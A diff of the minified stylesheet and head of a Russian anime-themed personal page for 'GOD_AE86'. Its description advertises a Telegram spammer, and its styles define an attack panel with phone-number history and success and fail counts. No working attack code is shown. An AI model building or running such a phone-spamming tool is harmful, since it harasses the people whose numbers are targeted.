@@ -5,678 +5,155 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
   <title>GOD_AE86 ✦ аниме-плеер</title>
   <meta name="description" content="Персональная страница GOD_AE86. Аниме-вайб, неко API и Telegram-спамер.">
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","name":"GOD_AE86","alternateName":"resivert","url":"https://t.me/GOD_AE86"}</script>
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/artplayer/dist/artplayer.css">
   <script src="https://cdn.jsdelivr.net/npm/artplayer/dist/artplayer.js" defer></script>
-  <link href="https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
-
   <style>
-    /* ═══════════════ ОРИГИНАЛЬНЫЙ ДИЗАЙН GOD_AE86 ═══════════════ */
-    :root {
-      --bg:       #1a1025;  --bg2:      #22133a;  --card:     rgba(34,18,58,0.88);
-      --text:     #f2deff;  --muted:    #c9a8e2;  --accent:   #ffb7c5;
-      --purple:   #c77dff;  --teal:     #a8edea;  --border:   rgba(199,125,255,0.22);
-      --shadow:   0 4px 40px rgba(255,183,197,0.16);
-      --glow:     0 0 28px rgba(255,183,197,0.42);
-      --pglow:    0 0 28px rgba(199,125,255,0.4);
-      --radius:   22px;
-      --tr:       0.32s cubic-bezier(.4,0,.2,1);
-      --fh:       'Mochiy Pop One', cursive;
-      --fb:       'Nunito', sans-serif;
-      --green:    #5ee8a0;
-      --red:      #ff6b6b;
-      --orange:   #ffaa5e;
-    }
-
-    [data-theme="light"] {
-      --bg:     #fce8f3;  --bg2:    #f9d8eb;  --card:   rgba(255,245,252,0.93);
-      --text:   #3a1a2e;  --muted:  #7a4a68;  --accent: #e05a82;
-      --purple: #9b59b6;  --border: rgba(224,90,130,0.22);
-      --shadow: 0 4px 30px rgba(224,90,130,0.13);
-      --glow:   0 0 24px rgba(224,90,130,0.38);
-      --pglow:  0 0 24px rgba(155,89,182,0.35);
-    }
-
-    [data-anime="on"] {
-      --accent:  #ff4da6;  --purple:  #bf00ff;  --border:  rgba(191,0,255,0.32);
-      --shadow:  0 4px 50px rgba(255,77,166,0.3);
-      --glow:    0 0 40px rgba(255,77,166,0.6);
-      --pglow:   0 0 40px rgba(191,0,255,0.55);
-    }
-
-    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
-    html { scroll-behavior: smooth; }
-
-    body {
-      font-family: var(--fb);
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      overflow-x: hidden;
-      transition: background .5s, color .5s;
-    }
-
-    body::before {
-      content: '';
-      position: fixed; inset: 0; z-index: 0; pointer-events: none;
-      background:
-        radial-gradient(ellipse 60% 55% at 10% 10%, rgba(199,125,255,.14) 0%, transparent 60%),
-        radial-gradient(ellipse 50% 45% at 90% 85%, rgba(255,183,197,.12) 0%, transparent 55%),
-        radial-gradient(ellipse 40% 40% at 55% 50%, rgba(168,237,234,.05) 0%, transparent 60%);
-      transition: opacity .5s;
-    }
-
-    #vfx-bg {
-      position: fixed; inset: 0;
-      pointer-events: none; z-index: 0;
-      overflow: hidden;
-    }
-
-    .petal {
-      position: absolute;
-      top: -60px;
-      border-radius: 50% 0 50% 0;
-      background: radial-gradient(ellipse at 35% 35%, #ffcfd9 0%, #ff85a1 55%, rgba(255,100,140,0) 100%);
-      opacity: .75;
-      animation: petalFall linear infinite;
-    }
-    @keyframes petalFall {
-      0%   { transform: translateY(-60px)  rotate(0deg)   translateX(0px);  opacity:.8; }
-      25%  { transform: translateY(25vh)   rotate(90deg)  translateX(28px);  }
-      50%  { transform: translateY(50vh)   rotate(180deg) translateX(-18px); opacity:.6; }
-      75%  { transform: translateY(75vh)   rotate(270deg) translateX(22px);  }
-      100% { transform: translateY(115vh)  rotate(360deg) translateX(0px);  opacity:0;  }
-    }
-
-    .star-vfx {
-      position: absolute;
-      border-radius: 50%;
-      background: var(--accent);
-      box-shadow: 0 0 8px var(--accent), 0 0 20px var(--purple);
-      opacity: 0;
-      animation: starDrop linear infinite;
-    }
-    @keyframes starDrop {
-      0%   { transform: translateY(-20px) scale(1);   opacity: 0; }
-      8%   { opacity: 1; }
-      92%  { opacity: .7; }
-      100% { transform: translateY(115vh) scale(.4); opacity: 0; }
-    }
-
-    .fixed-top {
-      position: fixed; top: 1rem; right: 1rem;
-      display: flex; gap: .55rem; z-index: 200;
-    }
-
-    .icon-btn {
-      width: 46px; height: 46px;
-      border-radius: 50%;
-      background: var(--card);
-      border: 1.5px solid var(--border);
-      cursor: pointer; font-size: 1.25rem;
-      display: flex; align-items: center; justify-content: center;
-      box-shadow: var(--shadow);
-      backdrop-filter: blur(14px);
-      transition: all var(--tr);
-      color: var(--text);
-    }
-    .icon-btn:hover {
-      transform: scale(1.12) rotate(12deg);
-      box-shadow: var(--glow);
-      border-color: var(--accent);
-    }
-
-    .page-wrap {
-      position: relative; z-index: 1;
-      display: flex; flex-direction: column; align-items: center;
-      padding: 2.2rem 1rem 5rem;
-      min-height: 100vh;
-    }
-
-    .container {
-      width: 100%; max-width: 920px;
-      display: flex; flex-direction: column;
-      gap: 1.6rem;
-    }
-
-    nav.tabs {
-      display: flex; gap: .55rem; flex-wrap: wrap;
-      padding: .6rem;
-      background: var(--card);
-      border-radius: var(--radius);
-      border: 1px solid var(--border);
-      backdrop-filter: blur(14px);
-      box-shadow: var(--shadow);
-    }
-
-    .tab {
-      flex: 1; min-width: 80px;
-      background: transparent; border: none;
-      padding: .65rem 1.3rem;
-      border-radius: calc(var(--radius) - 6px);
-      cursor: pointer;
-      font-weight: 800; font-family: var(--fh);
-      font-size: .72rem; letter-spacing: .2px;
-      color: var(--muted);
-      transition: all var(--tr);
-      white-space: nowrap; text-align: center;
-    }
-    .tab.active, .tab:hover {
-      background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
-      color: #fff;
-      box-shadow: 0 0 22px rgba(255,183,197,.45);
-      transform: translateY(-2px);
-    }
-
-    .tab-content { display: none; }
-    .tab-content.active {
-      display: block;
-      animation: fadeSlide .42s ease;
-    }
-    @keyframes fadeSlide {
-      from { opacity:0; transform:translateY(14px); }
-      to   { opacity:1; transform:translateY(0); }
-    }
-
-    .card {
-      background: var(--card);
-      border-radius: var(--radius);
-      padding: 2rem;
-      box-shadow: var(--shadow);
-      border: 1px solid var(--border);
-      backdrop-filter: blur(14px);
-      transition: box-shadow var(--tr), border-color var(--tr);
-      position: relative; overflow: hidden;
-    }
-    .card::before {
-      content: '';
-      position: absolute; top: -40%; left: -60%;
-      width: 38%; height: 200%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,.04), transparent);
-      transform: rotate(15deg);
-      animation: shimmer 5s 1s infinite;
-      pointer-events: none;
-    }
-    @keyframes shimmer {
-      0%   { left: -60%; }
-      100% { left: 160%; }
-    }
-    .card:hover {
-      box-shadow: var(--glow), var(--shadow);
-      border-color: var(--accent);
-    }
-
-    .profile {
-      display: flex; align-items: center;
-      gap: 2.5rem; flex-wrap: wrap;
-      justify-content: center;
-    }
-
-    .avatar-wrap { position: relative; flex-shrink: 0; }
-
-    .avatar {
-      width: 155px; height: 155px;
-      border-radius: 50%; overflow: hidden;
-      border: 3px solid transparent;
-      background:
-        linear-gradient(var(--card), var(--card)) padding-box,
-        linear-gradient(135deg, var(--accent), var(--purple)) border-box;
-      box-shadow:
-        0 0 0 6px rgba(199,125,255,.12),
-        0 0 40px rgba(255,183,197,.5),
-        0 0 80px rgba(199,125,255,.22);
-      transition: all .4s;
-    }
-    .avatar:hover { transform: rotate(6deg) scale(1.07); box-shadow: 0 0 0 6px rgba(199,125,255,.18), 0 0 55px rgba(255,183,197,.65); }
-    .avatar img { width:100%; height:100%; object-fit:cover; display:block; }
-
-    .avatar-ring {
-      position: absolute; inset: -8px;
-      border-radius: 50%;
-      border: 2px dashed var(--purple);
-      opacity: .5; pointer-events: none;
-      animation: spin 14s linear infinite;
-    }
-    .avatar-ring2 {
-      position: absolute; inset: -16px;
-      border-radius: 50%;
-      border: 1px dotted var(--accent);
-      opacity: .28; pointer-events: none;
-      animation: spin 22s linear infinite reverse;
-    }
-    @keyframes spin { to { transform:rotate(360deg); } }
-
-    .bio-info { text-align: center; flex:1; min-width:200px; }
-
-    .bio-name {
-      font-family: var(--fh);
-      font-size: 2.1rem; line-height:1.1;
-      background: linear-gradient(135deg, var(--accent) 20%, var(--purple) 80%);
-      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-      background-clip: text;
-      margin-bottom: .45rem;
-      filter: drop-shadow(0 0 12px rgba(255,183,197,.35));
-    }
-
-    .bio-handle {
-      color: var(--purple); font-size: .95rem;
-      font-weight: 700; margin-bottom: .5rem;
-    }
-    .bio-desc {
-      color: var(--muted); font-size: .9rem;
-      line-height: 1.6; margin-bottom: 1rem;
-    }
-
-    .badges { display:flex; flex-wrap:wrap; gap:.4rem; justify-content:center; margin-bottom:.8rem; }
-    .badge {
-      display: inline-block;
-      padding: .22rem .85rem;
-      border-radius: 2rem;
-      background: rgba(255,183,197,.1);
-      border: 1px solid rgba(255,183,197,.22);
-      color: var(--accent); font-size: .75rem; font-weight:700;
-      transition: all var(--tr);
-    }
-    .badge:hover { background: rgba(255,183,197,.2); transform:translateY(-2px); }
-
-    .quote-box {
-      margin-top: 1rem;
-      padding: 1rem 1.2rem;
-      background: rgba(199,125,255,.08);
-      border-left: 3px solid var(--purple);
-      border-radius: 0 16px 16px 0;
-      text-align: left;
-      position: relative;
-    }
-    .quote-box::before {
-      content: '❝'; font-size: 2rem;
-      color: var(--purple); opacity:.4;
-      position: absolute; top:-6px; left:8px;
-      line-height:1;
-    }
-    .quote-text {
-      font-style: italic; color: var(--muted);
-      font-size: .85rem; line-height:1.55;
-      padding-left:.4rem;
-    }
-    .quote-src {
-      color: var(--accent); font-weight:700;
-      font-size: .78rem; margin-top:.5rem;
-    }
-    .quote-btn {
-      margin-top: .75rem;
-      background: transparent;
-      border: 1px solid var(--border);
-      color: var(--muted); border-radius: 2rem;
-      padding: .3rem 1rem; cursor: pointer;
-      font-size: .75rem; font-family: var(--fb);
-      transition: all var(--tr);
-    }
-    .quote-btn:hover { border-color:var(--accent); color:var(--accent); transform:scale(1.04); }
-
-    .social-links {
-      display:flex; gap:.75rem; margin-top:1rem;
-      justify-content:center; flex-wrap:wrap;
-    }
-    .social-btn {
-      display:inline-flex; align-items:center; justify-content:center;
-      width:48px; height:48px; border-radius:50%;
-      border: 1.5px solid var(--border);
-      color: var(--muted);
-      background: rgba(199,125,255,.06);
-      transition: all var(--tr);
-      text-decoration: none; font-size:1.1rem;
-    }
-    .social-btn:hover {
-      border-color: var(--accent); color: var(--accent);
-      background: rgba(255,183,197,.13);
-      transform: translateY(-4px) scale(1.1);
-      box-shadow: 0 0 18px rgba(255,183,197,.45);
-    }
-    .social-btn svg { width:20px; height:20px; fill:currentColor; }
-
-    .services-status {
-      font-size: .8rem;
-      color: var(--muted);
-      margin: .2rem 0 .8rem;
-    }
-
-    .attack-title {
-      font-family: var(--fh);
-      font-size: 1.35rem;
-      background: linear-gradient(135deg, var(--accent), var(--purple));
-      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
-      background-clip:text;
-      margin-bottom: 1rem;
-    }
-
-    .form-row {
-      display: flex;
-      gap: 1rem;
-      margin-bottom: 1rem;
-      flex-wrap: wrap;
-    }
-    .inp-group {
-      flex: 1;
-      min-width: 140px;
-    }
-    .inp-group label {
-      display: block;
-      font-size: .75rem;
-      color: var(--muted);
-      margin-bottom: .3rem;
-    }
-    .inp-group input, .inp-group select {
-      width: 100%;
-      padding: .65rem .9rem;
-      background: rgba(199,125,255,.06);
-      border: 1.5px solid var(--border);
-      border-radius: 14px;
-      color: var(--text);
-      font-family: var(--fb);
-      font-size: .9rem;
-      outline: none;
-      transition: .2s;
-    }
-    .inp-group input:focus, .inp-group select:focus {
-      border-color: var(--accent);
-    }
-
-    .region-chips {
-      display: flex;
-      gap: .5rem;
-      margin-bottom: 1rem;
-    }
-    .region-chip {
-      padding: .4rem 1rem;
-      border-radius: 20px;
-      border: 1px solid var(--border);
-      background: transparent;
-      color: var(--muted);
-      cursor: pointer;
-      font-weight: 600;
-      font-size: .8rem;
-      transition: .2s;
-    }
-    .region-chip.active {
-      background: var(--accent);
-      border-color: var(--accent);
-      color: #fff;
-    }
-
-    .btn {
-      border:none; cursor:pointer;
-      font-weight:800; font-family:var(--fb);
-      font-size:.83rem; letter-spacing:.1px;
-      padding: .76rem 1.4rem; border-radius:14px;
-      transition: all var(--tr);
-      position:relative; overflow:hidden;
-    }
-    .btn::after {
-      content:''; position:absolute; inset:0;
-      background:linear-gradient(135deg,rgba(255,255,255,.18),transparent);
-      opacity:0; transition:opacity .2s;
-    }
-    .btn:hover::after { opacity:1; }
-
-    .btn-primary {
-      background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
-      color:#fff;
-      box-shadow: 0 4px 22px rgba(255,183,197,.38);
-    }
-    .btn-primary:hover {
-      transform: translateY(-2px) scale(1.04);
-      box-shadow: 0 6px 32px rgba(255,183,197,.55);
-    }
-    .btn-primary:active { transform: scale(.97); }
-
-    .btn-outline {
-      background:transparent;
-      border:1.5px solid var(--border);
-      color:var(--muted);
-    }
-    .btn-outline:hover {
-      border-color:var(--accent); color:var(--accent);
-      background:rgba(255,183,197,.09);
-      transform:translateY(-1px);
-    }
-
-    .atk-overlay {
-      display: none;
-      position: fixed;
-      inset: 0;
-      z-index: 300;
-      background: var(--bg);
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      animation: fadeIn .3s;
-    }
-    .atk-overlay.active { display: flex; }
-    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
-
-    .atk-timer {
-      font-family: var(--fh);
-      font-size: 3.5rem;
-      color: var(--text);
-      display: flex;
-      align-items: baseline;
-      gap: .2rem;
-    }
-    .atk-timer small {
-      font-size: 1.2rem;
-      color: var(--muted);
-    }
-    .atk-progress {
-      width: 80%;
-      height: 6px;
-      background: var(--card);
-      border-radius: 4px;
-      margin: 1.5rem 0;
-      overflow: hidden;
-    }
-    .atk-progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, var(--accent), var(--purple));
-      width: 0%;
-      transition: width .3s;
-    }
-    .atk-stats {
-      display: flex;
-      gap: 2rem;
-      margin-bottom: 2rem;
-    }
-    .atk-stat {
-      text-align: center;
-    }
-    .atk-stat b {
-      font-size: 1.8rem;
-      color: var(--text);
-    }
-    .atk-stat small {
-      font-size: .7rem;
-      color: var(--muted);
-      text-transform: uppercase;
-    }
-    .atk-stop-btn {
-      padding: .8rem 2.5rem;
-      background: rgba(255,107,107,.1);
-      border: 1.5px solid rgba(255,107,107,.3);
-      border-radius: 30px;
-      color: #ff6b6b;
-      font-weight: 700;
-      cursor: pointer;
-      transition: .2s;
-    }
-    .atk-stop-btn:active { transform: scale(.96); }
-
-    .history-list {
-      margin-top: 1.5rem;
-    }
-    .history-item {
-      background: rgba(199,125,255,.04);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: .8rem 1rem;
-      margin-bottom: .5rem;
-      font-size: .8rem;
-    }
-    .history-item .h-top {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: .3rem;
-    }
-    .history-item .h-phone {
-      font-weight: 700;
-      color: var(--text);
-    }
-    .history-item .h-region {
-      font-size: .7rem;
-      color: var(--accent);
-    }
-    .history-item .h-stats {
-      display: flex;
-      gap: 1rem;
-      font-size: .75rem;
-      color: var(--muted);
-    }
-    .history-item .h-stats .ok { color: #5ee8a0; }
-    .history-item .h-stats .fail { color: #ff6b6b; }
-
-    .ip-check-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 1rem;
-    }
-    .ip-check-table td {
-      padding: 0.5rem 0.8rem;
-      border-bottom: 1px solid var(--border);
-      font-size: 0.85rem;
-    }
-    .ip-check-table td:first-child {
-      color: var(--muted);
-      width: 55%;
-    }
-    .ip-check-table td:last-child {
-      font-weight: 600;
-    }
-    .ip-check-table .ok { color: var(--green); }
-    .ip-check-table .warn { color: var(--orange); }
-    .ip-check-table .bad { color: var(--red); }
-
-    .music-wrap { text-align:center; }
-    .music-title {
-      font-family:var(--fh); font-size:1.5rem;
-      color:var(--accent); margin-bottom:.5rem;
-    }
-    .music-sub { color:var(--muted); font-size:.85rem; margin-bottom:1.5rem; }
-    audio {
-      width:100%; border-radius:14px;
-      accent-color:var(--accent);
-      filter: drop-shadow(0 0 8px rgba(255,183,197,.25));
-    }
-    .now-playing {
-      margin-top:1rem; font-size:.82rem; color:var(--muted);
-      display:flex; align-items:center; justify-content:center; gap:.55rem;
-    }
-    .now-playing span {
-      width:9px; height:9px; border-radius:50%;
-      background:var(--accent);
-      display:inline-block;
-      animation:pulseNow 1.6s ease-in-out infinite;
-    }
-    @keyframes pulseNow {
-      0%,100%{ transform:scale(1); opacity:1; }
-      50%    { transform:scale(1.5); opacity:.5; }
-    }
-
-    .gallery-title {
-      font-family:var(--fh); font-size:1.4rem;
-      color:var(--accent); margin-bottom:.4rem;
-    }
-    .gallery-sub { color:var(--muted); font-size:.83rem; margin-bottom:1rem; }
-
-    #gallery {
-      display:grid;
-      grid-template-columns:repeat(auto-fill, minmax(155px,1fr));
-      gap:1rem;
-    }
-    #gallery img {
-      width:100%; aspect-ratio:1; object-fit:cover;
-      border-radius:16px; border:1.5px solid var(--border);
-      transition: all .32s;
-      cursor:pointer;
-    }
-    #gallery img:hover {
-      transform:scale(1.06) rotate(1.5deg);
-      box-shadow:0 0 24px rgba(255,183,197,.45);
-      border-color:var(--accent);
-    }
-
-    .neko-wrap {
-      position:fixed; bottom:1.3rem; right:1.3rem;
-      z-index:150; display:flex; flex-direction:column;
-      align-items:center; gap:.4rem;
-    }
-    .neko-tip {
-      background:var(--card); border:1px solid var(--border);
-      color:var(--accent); font-size:.65rem;
-      padding:.25rem .7rem; border-radius:2rem;
-      backdrop-filter:blur(10px);
-      pointer-events:none; opacity:0;
-      transition:opacity .3s; white-space:nowrap;
-      box-shadow:var(--shadow);
-    }
-    .neko-corner {
-      width:72px; height:72px; border-radius:50%;
-      border:2.5px solid var(--accent); overflow:hidden;
-      box-shadow:0 0 22px rgba(255,183,197,.55);
-      cursor:pointer; transition:all .3s;
-    }
-    .neko-corner:hover { transform:scale(1.12); box-shadow:0 0 35px rgba(255,183,197,.75); }
-    .neko-corner:hover + .neko-tip { opacity:1; }
-    .neko-corner img { width:100%; height:100%; object-fit:cover; transition:transform .4s; }
-    .neko-corner:hover img { transform:scale(1.18); }
-
-    @media (max-width:660px) {
-      .profile        { flex-direction:column; gap:1.6rem; }
-      .bio-name       { font-size:1.6rem; }
-      .card           { padding:1.4rem; }
-      .avatar         { width:125px; height:125px; }
-      .btn            { font-size:.76rem; padding:.66rem 1.1rem; }
-      #gallery        { grid-template-columns:repeat(auto-fill,minmax(120px,1fr)); }
-    }
-
-    ::-webkit-scrollbar        { width:6px; }
-    ::-webkit-scrollbar-track  { background:var(--bg); }
-    ::-webkit-scrollbar-thumb  { background:var(--accent); border-radius:3px; }
+    :root{--bg:#1a1025;--bg2:#22133a;--card:rgba(34,18,58,0.88);--text:#f2deff;--muted:#c9a8e2;--accent:#ffb7c5;--purple:#c77dff;--teal:#a8edea;--border:rgba(199,125,255,0.22);--shadow:0 4px 40px rgba(255,183,197,0.16);--glow:0 0 28px rgba(255,183,197,0.42);--pglow:0 0 28px rgba(199,125,255,0.4);--radius:22px;--tr:0.32s cubic-bezier(.4,0,.2,1);--fh:'Comic Sans MS','Chalkboard SE','Marker Felt',cursive;--fb:system-ui,-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
+    [data-theme="light"]{--bg:#fce8f3;--bg2:#f9d8eb;--card:rgba(255,245,252,0.93);--text:#3a1a2e;--muted:#7a4a68;--accent:#e05a82;--purple:#9b59b6;--border:rgba(224,90,130,0.22);--shadow:0 4px 30px rgba(224,90,130,0.13);--glow:0 0 24px rgba(224,90,130,0.38);--pglow:0 0 24px rgba(155,89,182,0.35)}
+    [data-anime="on"]{--accent:#ff4da6;--purple:#bf00ff;--border:rgba(191,0,255,0.32);--shadow:0 4px 50px rgba(255,77,166,0.3);--glow:0 0 40px rgba(255,77,166,0.6);--pglow:0 0 40px rgba(191,0,255,0.55)}
+    *,::before,::after{margin:0;padding:0;box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{font-family:var(--fb);background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;transition:background .5s,color .5s}
+    body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(ellipse 60% 55% at 10% 10%,rgba(199,125,255,.14) 0%,transparent 60%),radial-gradient(ellipse 50% 45% at 90% 85%,rgba(255,183,197,.12) 0%,transparent 55%),radial-gradient(ellipse 40% 40% at 55% 50%,rgba(168,237,234,.05) 0%,transparent 60%);transition:opacity .5s}
+    #vfx-canvas{position:fixed;inset:0;pointer-events:none;z-index:0}
+    .fixed-top{position:fixed;top:1rem;right:1rem;display:flex;gap:.55rem;z-index:200}
+    .icon-btn{width:46px;height:46px;border-radius:50%;background:var(--card);border:1.5px solid var(--border);cursor:pointer;font-size:1.25rem;display:flex;align-items:center;justify-content:center;box-shadow:var(--shadow);backdrop-filter:blur(14px);transition:all var(--tr);color:var(--text)}
+    .icon-btn:hover{transform:scale(1.12) rotate(12deg);box-shadow:var(--glow);border-color:var(--accent)}
+    .page-wrap{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;padding:2.2rem 1rem 5rem;min-height:100vh}
+    .container{width:100%;max-width:920px;display:flex;flex-direction:column;gap:1.6rem}
+    nav.tabs{display:flex;gap:.55rem;flex-wrap:wrap;padding:.6rem;background:var(--card);border-radius:var(--radius);border:1px solid var(--border);backdrop-filter:blur(14px);box-shadow:var(--shadow)}
+    .tab{flex:1;min-width:70px;background:transparent;border:none;padding:.65rem 1.1rem;border-radius:calc(var(--radius) - 6px);cursor:pointer;font-weight:800;font-family:var(--fh);font-size:.72rem;letter-spacing:.2px;color:var(--muted);transition:all var(--tr);white-space:nowrap;text-align:center}
+    .tab.active,.tab:hover{background:linear-gradient(135deg,var(--accent) 0%,var(--purple) 100%);color:#fff;box-shadow:0 0 22px rgba(255,183,197,.45);transform:translateY(-2px)}
+    .tab-content{display:none}
+    .tab-content.active{display:block;animation:fadeSlide .42s ease}
+    @keyframes fadeSlide{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+    .card{background:var(--card);border-radius:var(--radius);padding:2rem;box-shadow:var(--shadow);border:1px solid var(--border);backdrop-filter:blur(14px);transition:box-shadow var(--tr),border-color var(--tr);position:relative;overflow:hidden}
+    .card::before{content:'';position:absolute;top:-40%;left:-60%;width:38%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.04),transparent);transform:rotate(15deg);animation:shimmer 5s 1s infinite;pointer-events:none}
+    @keyframes shimmer{0%{left:-60%}100%{left:160%}}
+    .card:hover{box-shadow:var(--glow),var(--shadow);border-color:var(--accent)}
+    .profile{display:flex;align-items:center;gap:2.5rem;flex-wrap:wrap;justify-content:center}
+    .avatar-wrap{position:relative;flex-shrink:0}
+    .avatar{width:155px;height:155px;border-radius:50%;overflow:hidden;border:3px solid transparent;background:linear-gradient(var(--card),var(--card)) padding-box,linear-gradient(135deg,var(--accent),var(--purple)) border-box;box-shadow:0 0 0 6px rgba(199,125,255,.12),0 0 40px rgba(255,183,197,.5),0 0 80px rgba(199,125,255,.22);transition:all .4s}
+    .avatar:hover{transform:rotate(6deg) scale(1.07);box-shadow:0 0 0 6px rgba(199,125,255,.18),0 0 55px rgba(255,183,197,.65)}
+    .avatar img{width:100%;height:100%;object-fit:cover;display:block}
+    .avatar-ring{position:absolute;inset:-8px;border-radius:50%;border:2px dashed var(--purple);opacity:.5;pointer-events:none;animation:spin 14s linear infinite}
+    .avatar-ring2{position:absolute;inset:-16px;border-radius:50%;border:1px dotted var(--accent);opacity:.28;pointer-events:none;animation:spin 22s linear infinite reverse}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    .bio-info{text-align:center;flex:1;min-width:200px}
+    .bio-name{font-family:var(--fh);font-size:2.1rem;line-height:1.1;background:linear-gradient(135deg,var(--accent) 20%,var(--purple) 80%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:.45rem;filter:drop-shadow(0 0 12px rgba(255,183,197,.35))}
+    .bio-handle{color:var(--purple);font-size:.95rem;font-weight:700;margin-bottom:.5rem}
+    .bio-desc{color:var(--muted);font-size:.9rem;line-height:1.6;margin-bottom:1rem}
+    .badges{display:flex;flex-wrap:wrap;gap:.4rem;justify-content:center;margin-bottom:.8rem}
+    .badge{display:inline-block;padding:.22rem .85rem;border-radius:2rem;background:rgba(255,183,197,.1);border:1px solid rgba(255,183,197,.22);color:var(--accent);font-size:.75rem;font-weight:700;transition:all var(--tr)}
+    .badge:hover{background:rgba(255,183,197,.2);transform:translateY(-2px)}
+    .quote-box{margin-top:1rem;padding:1rem 1.2rem;background:rgba(199,125,255,.08);border-left:3px solid var(--purple);border-radius:0 16px 16px 0;text-align:left;position:relative}
+    .quote-box::before{content:'❝';font-size:2rem;color:var(--purple);opacity:.4;position:absolute;top:-6px;left:8px;line-height:1}
+    .quote-text{font-style:italic;color:var(--muted);font-size:.85rem;line-height:1.55;padding-left:.4rem}
+    .quote-src{color:var(--accent);font-weight:700;font-size:.78rem;margin-top:.5rem}
+    .quote-btn{margin-top:.75rem;background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:2rem;padding:.3rem 1rem;cursor:pointer;font-size:.75rem;font-family:var(--fb);transition:all var(--tr)}
+    .quote-btn:hover{border-color:var(--accent);color:var(--accent);transform:scale(1.04)}
+    .social-links{display:flex;gap:.75rem;margin-top:1rem;justify-content:center;flex-wrap:wrap}
+    .social-btn{display:inline-flex;align-items:center;justify-content:center;width:48px;height:48px;border-radius:50%;border:1.5px solid var(--border);color:var(--muted);background:rgba(199,125,255,.06);transition:all var(--tr);text-decoration:none;font-size:1.1rem}
+    .social-btn:hover{border-color:var(--accent);color:var(--accent);background:rgba(255,183,197,.13);transform:translateY(-4px) scale(1.1);box-shadow:0 0 18px rgba(255,183,197,.45)}
+    .social-btn svg{width:20px;height:20px;fill:currentColor}
+    .attack-title{font-family:var(--fh);font-size:1.35rem;background:linear-gradient(135deg,var(--accent),var(--purple));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:1rem}
+    .form-row{display:flex;gap:1rem;margin-bottom:1rem;flex-wrap:wrap}
+    .inp-group{flex:1;min-width:140px}
+    .inp-group label{display:block;font-size:.75rem;color:var(--muted);margin-bottom:.3rem}
+    .inp-group input,.inp-group select{width:100%;padding:.65rem .9rem;background:rgba(199,125,255,.06);border:1.5px solid var(--border);border-radius:14px;color:var(--text);font-family:var(--fb);font-size:.9rem;outline:none;transition:.2s}
+    .inp-group input:focus,.inp-group select:focus{border-color:var(--accent)}
+    .region-chips{display:flex;gap:.5rem;margin-bottom:1rem}
+    .region-chip{padding:.4rem 1rem;border-radius:20px;border:1px solid var(--border);background:transparent;color:var(--muted);cursor:pointer;font-weight:600;font-size:.8rem;transition:.2s}
+    .region-chip.active{background:var(--accent);border-color:var(--accent);color:#fff}
+    .btn{border:none;cursor:pointer;font-weight:800;font-family:var(--fb);font-size:.83rem;letter-spacing:.1px;padding:.76rem 1.4rem;border-radius:14px;transition:all var(--tr);position:relative;overflow:hidden}
+    .btn::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.18),transparent);opacity:0;transition:opacity .2s}
+    .btn:hover::after{opacity:1}
+    .btn-primary{background:linear-gradient(135deg,var(--accent) 0%,var(--purple) 100%);color:#fff;box-shadow:0 4px 22px rgba(255,183,197,.38)}
+    .btn-primary:hover{transform:translateY(-2px) scale(1.04);box-shadow:0 6px 32px rgba(255,183,197,.55)}
+    .btn-primary:active{transform:scale(.97)}
+    .btn-outline{background:transparent;border:1.5px solid var(--border);color:var(--muted)}
+    .btn-outline:hover{border-color:var(--accent);color:var(--accent);background:rgba(255,183,197,.09);transform:translateY(-1px)}
+    .atk-overlay{display:none;position:fixed;inset:0;z-index:300;background:var(--bg);flex-direction:column;align-items:center;justify-content:center;animation:fadeIn .3s}
+    .atk-overlay.active{display:flex}
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    .atk-timer{font-family:var(--fh);font-size:3.5rem;color:var(--text);display:flex;align-items:baseline;gap:.2rem}
+    .atk-timer small{font-size:1.2rem;color:var(--muted)}
+    .atk-progress{width:80%;height:6px;background:var(--card2);border-radius:4px;margin:1.5rem 0;overflow:hidden}
+    .atk-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--purple));width:0%;transition:width .3s}
+    .atk-stats{display:flex;gap:2rem;margin-bottom:2rem}
+    .atk-stat{text-align:center}
+    .atk-stat b{font-size:1.8rem;color:var(--text)}
+    .atk-stat small{font-size:.7rem;color:var(--muted);text-transform:uppercase}
+    .atk-stop-btn{padding:.8rem 2.5rem;background:rgba(255,107,107,.1);border:1.5px solid rgba(255,107,107,.3);border-radius:30px;color:#ff6b6b;font-weight:700;cursor:pointer;transition:.2s}
+    .atk-stop-btn:active{transform:scale(.96)}
+    .history-list{margin-top:1.5rem}
+    .history-item{background:rgba(199,125,255,.04);border:1px solid var(--border);border-radius:12px;padding:.8rem 1rem;margin-bottom:.5rem;font-size:.8rem}
+    .history-item .h-top{display:flex;justify-content:space-between;margin-bottom:.3rem}
+    .history-item .h-phone{font-weight:700;color:var(--text)}
